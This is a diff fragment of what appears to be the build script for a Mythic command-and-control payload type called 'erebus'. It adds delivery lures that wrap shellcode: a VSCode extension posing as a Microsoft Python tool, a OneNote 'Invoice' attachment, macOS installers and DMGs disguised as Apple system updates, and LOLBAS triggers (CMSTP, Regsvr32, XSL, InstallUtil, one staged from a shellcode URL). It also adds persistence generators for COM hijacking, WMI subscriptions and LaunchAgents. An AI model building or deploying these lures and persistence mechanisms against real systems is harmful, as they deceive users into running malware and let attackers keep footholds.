                         await self._build_step(compile_step_name, compile_step_msg, success=True)
                     else:
                         response.status = BuildStatus.Error
-                        response.build_message = "Failed to compile VM Loader"
+                        response.build_message = f"Failed to copy loader to payload dir"
                         response.build_stderr = output + "\n" + payload_path
-                        await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
+                        await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
                         return response
-
-            elif payload_type in ("Linux", "macOS"):
-                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                payload_path = str(payload_path)
-
-                if not os.path.exists(payload_output_file):
-                    response.status = BuildStatus.Error
-                    response.build_message = f"Compilation failed - output not found: {payload_output_file}"
-                    response.build_stderr = output
-                    await self._build_step(compile_step_name, f"Compilation failed", success=False)
-                    return response
-
-                shutil.copy(dst=payload_path, src=payload_output_file)
-
-                if os.path.exists(payload_path):
-                    response.status = BuildStatus.Success
-                    response.build_message = compile_step_msg
-                    response.build_stdout = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-                else:
-                    response.status = BuildStatus.Error
-                    response.build_message = f"Failed to copy loader to payload dir"
-                    response.build_stderr = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
-                    return response
 
             output = ""
             ######################### End Of Payload Build Section #########################
@@ -5319,7 +5875,14 @@ generated if none have been entered.""",
                             if self.get_parameter("2.0 Compression Type") != "NONE":
                                 cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
 
-                            subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
+                            _proc = await asyncio.create_subprocess_exec(
+                                *cmd,
+                                stdout=asyncio.subprocess.PIPE,
+                                stderr=asyncio.subprocess.PIPE,
+                            )
+                            _out, _err = await _proc.communicate()
+                            if _proc.returncode != 0:
+                                raise subprocess.CalledProcessError(_proc.returncode, cmd, _out + _err)
 
                             shellcode_vba = open(vba_tmp, 'r').read()
                             os.unlink(vba_tmp)
@@ -5716,10 +6279,12 @@ generated if none have been entered.""",
                             )
 
                         case "MSI":
-                            trigger_path= create_msi_payload_trigger(
-                                payload_exe="erebus.exe",
-                                payload_dir=payload_dir,
-                                decoy_file=decoy_file
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_msi_payload_trigger(
+                                    payload_exe="erebus.exe",
+                                    payload_dir=payload_dir,
+                                    decoy_file=decoy_file,
+                                )
                             )
                         case "ClickOnce":
                             trigger_path = await create_clickonce_trigger(
@@ -5776,6 +6341,55 @@ generated if none have been entered.""",
                                 payload_dir=payload_dir,
                                 decoy_path=str(decoy_file) if decoy_file.exists() else "",
                             )
+
+                        case "VSCode":
+                            _vsix_prebuilt = None
+                            try:
+                                if loader_format == "dll" and os.path.exists(payload_output_file):
+                                    _vsix_prebuilt = pathlib.Path(payload_output_file)
+                            except NameError:
+                                pass
+                            _vscode_fake_name = self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools"
+                            _vscode_publisher = self.get_parameter("0.9x VSCode Publisher") or "ms-python"
+                            _vscode_sc_path = pathlib.Path(mythic_shellcode_path)
+
+                            _vscode_icon_path = None
+                            _vscode_icon_uuid = self.get_parameter("0.9y VSCode Custom Icon")
+                            if _vscode_icon_uuid:
+                                _icon_resp = await SendMythicRPCFileGetContent(
+                                    MythicRPCFileGetContentMessage(AgentFileId=_vscode_icon_uuid)
+                                )
+                                if _icon_resp.Success and _icon_resp.Content:
+                                    _vscode_icon_path = pathlib.Path(payload_dir) / "vscode_icon.png"
+                                    _vscode_icon_path.write_bytes(_icon_resp.Content)
+                                else:
+                                    output += "[!] VSCode custom icon was uploaded but could not be retrieved - falling back to no icon.\n"
+
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_vscode_ext_trigger(
+                                    shellcode_path=_vscode_sc_path,
+                                    payload_dir=payload_dir,
+                                    decoy_file=decoy_file,
+                                    fake_name=_vscode_fake_name,
+                                    publisher=_vscode_publisher,
+                                    output_filename="installer.vsix",
+                                    prebuilt_dll_path=_vsix_prebuilt,
+                                    custom_icon_path=_vscode_icon_path,
+                                )
+                            )
+
+                            if trigger_path and pathlib.Path(trigger_path).exists():
+                                _vsix_abs = pathlib.Path(trigger_path).resolve()
+                                for _item in list(payload_dir.iterdir()):
+                                    if _item.resolve() == _vsix_abs:
+                                        continue
+                                    if _item.is_dir():
+                                        shutil.rmtree(_item, ignore_errors=True)
+                                    else:
+                                        try:
+                                            _item.unlink()
+                                        except Exception:
+                                            pass
 
                         case "URL":
                             trigger_path = create_url_trigger(
@@ -5898,6 +6512,79 @@ generated if none have been entered.""",
                                     output_dir=payload_dir,
                                 )
 
+                        case "OneNote":
+                            # Deferred build: stage source + emit build_onenote.bat.
+                            # Operator runs build_onenote.bat on a Windows host with
+                            # Microsoft OneNote installed to produce document.one.
+                            _one_payload = payload_dir / "erebus.exe"
+                            for _ext in ("dll", "xll"):
+                                _cand = payload_dir / f"erebus.{_ext}"
+                                if _cand.exists():
+                                    _one_payload = _cand
+                                    break
+                            _one_attach = str(self.get_parameter("0.9a Trigger Binary") or f"Invoice{_one_payload.suffix}")
+                            _one_title  = str(self.get_parameter("0.9b Trigger Command") or "Invoice")
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_onenote_trigger(
+                                    payload_path=_one_payload,
+                                    payload_dir=payload_dir,
+                                    attachment_name=_one_attach,
+                                    note_title=_one_title,
+                                )
+                            )
+
+                        # ── LOLBAS triggers (Windows) ────────────────────────
+                        case "CMSTP":
+                            _cmstp_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _cmstp_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_cmstp_trigger(
+                                    payload_path=_cmstp_bin,
+                                    output_dir=str(payload_dir),
+                                )
+                            )
+                            trigger_path = _cmstp_result.get("inf_path", "")
+
+                        case "Regsvr32":
+                            _r32_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _r32_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_regsvr32_trigger(
+                                    payload_path=_r32_bin,
+                                    output_dir=str(payload_dir),
+                                    mode="remote",
+                                )
+                            )
+                            trigger_path = _r32_result.get("artifact_path", "")
+
+                        case "XSL":
+                            _xsl_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _xsl_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_xsl_trigger(
+                                    payload_path=_xsl_bin,
+                                    output_dir=str(payload_dir),
+                                )
+                            )
+                            trigger_path = _xsl_result.get("xsl_path", "")
+
+                        case "InstallUtil":
+                            _iu_bin = str(self.get_parameter("0.9a Trigger Binary") or "")
+                            if _iu_bin and os.path.isfile(_iu_bin):
+                                _iu_result = await asyncio.get_running_loop().run_in_executor(
+                                    None, lambda: create_installutil_trigger(
+                                        payload_path=_iu_bin,
+                                        output_dir=str(payload_dir),
+                                        mode="inline",
+                                    )
+                                )
+                            else:
+                                _iu_result = await asyncio.get_running_loop().run_in_executor(
+                                    None, lambda: create_installutil_trigger(
+                                        payload_path=_iu_bin or "http://localhost/shellcode.bin",
+                                        output_dir=str(payload_dir),
+                                        mode="staged",
+                                    )
+                                )
+                            trigger_path = _iu_result.get("cs_path", "")
+
                         # ── Linux triggers ────────────────────────────────────
                         case "Bash":
                             trigger_path = create_bash_trigger(
@@ -5950,12 +6637,58 @@ generated if none have been entered.""",
 
                         case "PKG":
                             _pkg_payload = payload_dir / "payload"
-                            trigger_path = create_pkg_trigger(
-                                payload_path=str(_pkg_payload),
-                                output_dir=str(payload_dir),
-                                payload_dir=payload_dir,
-                                pkg_name="SystemUpdate.pkg",
-                                bundle_id="com.apple.systemupdate",
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_pkg_trigger(
+                                    payload_path=str(_pkg_payload),
+                                    output_dir=str(payload_dir),
+                                    payload_dir=payload_dir,
+                                    pkg_name="SystemUpdate.pkg",
+                                    bundle_id="com.apple.systemupdate",
+                                )
+                            )
+
+                        case "AppBundle":
+                            _ab_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_appbundle_trigger(
+                                    payload_path=str(_ab_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=False,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
+                                )
+                            )
+
+                        case "AppBundle-AdHoc":
+                            _ab_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_appbundle_trigger(
+                                    payload_path=str(_ab_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=True,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
+                                )
+                            )
+
+                        case "DMG":
+                            _dmg_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_dmg_trigger(
+                                    payload_path=str(_dmg_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    dmg_name="Install.dmg",
+                                    volume_name="Installer",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=False,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
+                                )
                             )
 
                     if trigger_path:
@@ -6164,6 +6897,71 @@ generated if none have been entered.""",
                     await self._build_step(
                         "[T1566.001] - Decoy Document",
                         f"Decoy document generation failed: {_decoy_ex}",
+                        success=False,
+                    )
+
+            # Standalone persistence artifact generation
+            if self.get_parameter("10.0 Standalone Persistence"):
+                try:
+                    _persist_method  = self.get_parameter("10.1 Persistence Method") or "COM Hijack"
+                    _persist_binary  = self.get_parameter("10.2 Persistence Target Binary") or ""
+                    _persist_out_dir = str(Path(agent_build_path) / "payload" / "persistence")
+
+                    match _persist_method:
+                        case "COM Hijack":
+                            _com_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_com_hijack_dropper(
+                                    payload_path=_persist_binary or "C:\\ProgramData\\Update\\loader.exe",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"COM Hijack artifacts in persistence/\n"
+                                f"  reg  : {_com_result.get('reg_path', '')}\n"
+                                f"  CLSID: {_com_result.get('clsid', '')}\n"
+                                f"  import: {_com_result.get('import_cmd', '')}"
+                            )
+
+                        case "WMI Subscription":
+                            _wmi_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_wmi_subscription(
+                                    payload_path=_persist_binary or "C:\\ProgramData\\Update\\loader.exe",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"WMI Subscription artifacts in persistence/\n"
+                                f"  ps1     : {_wmi_result.get('ps1_path', '')}\n"
+                                f"  mof     : {_wmi_result.get('mof_path', '')}\n"
+                                f"  mofcomp : {_wmi_result.get('mofcomp_cmd', '')}"
+                            )
+
+                        case "LaunchAgent":
+                            _la_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_launchagent(
+                                    payload_path=_persist_binary or "/tmp/loader",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"LaunchAgent artifacts in persistence/\n"
+                                f"  plist  : {_la_result.get('plist_path', '')}\n"
+                                f"  install: {_la_result.get('install_sh', '')}\n"
+                                f"  load   : {_la_result.get('load_cmd', '')}"
+                            )
+
+                        case _:
+                            _persist_detail = f"Unknown persistence method: {_persist_method}"
+
+                    await self._build_step(
+                        "[T1546] - Standalone Persistence",
+                        _persist_detail,
+                        success=True,
+                    )
+                except Exception as _persist_ex:
+                    await self._build_step(
+                        "[T1546] - Standalone Persistence",
+                        f"Persistence artifact generation failed: {_persist_ex}",
                         success=False,
                     )
 
